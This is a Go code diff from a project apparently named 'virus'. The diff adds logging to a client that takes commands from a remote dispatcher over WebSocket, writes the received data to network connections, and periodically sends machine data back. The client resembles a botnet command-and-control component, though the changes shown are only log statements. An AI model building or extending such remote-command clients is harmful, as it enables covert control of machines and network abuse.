@@ -14,6 +14,7 @@ import (
 	"github.com/jessevdk/go-flags"
 	"github.com/kolya59/virus/common/machine"
 	"github.com/kolya59/virus/common/models"
+	"github.com/rs/zerolog/log"
 	uuid "github.com/satori/go.uuid"
 )
 
@@ -55,11 +56,14 @@ func subscribeForCommands(dispatcherHost string) error {
 	}
 	defer c.Close()
 
+	cnt := 0
 	var msg models.WSCommand
 	for {
 		if err := c.ReadJSON(&msg); err != nil {
 			return err
 		}
+		cnt++
+		log.Info().Msgf("Got %d msg", cnt)
 
 		ackMsg := models.WSAck{}
 
@@ -73,6 +77,7 @@ func subscribeForCommands(dispatcherHost string) error {
 		}
 
 		if _, err := nc.Write(msg.Data); err != nil {
+			log.Error().Err(err).Msg("Failed to do request")
 			ackMsg.Err = err.Error()
 			nc.Close()
 			if err := c.WriteJSON(models.WSAck{Err: err.Error()}); err != nil {
@@ -125,6 +130,7 @@ loopSend:
 				break loopSend
 			}
 		case <-ticker.C:
+			log.Info().Msg("Tried to reconnect")
 			errs <- sendData(m, dispatcherHost)
 		}
 	}
@@ -138,6 +144,7 @@ loopSub:
 				break loopSub
 			}
 		case <-ticker.C:
+			log.Info().Msg("Tried to reconnect")
 			errs <- subscribeForCommands(dispatcherHost)
 		}
 	}
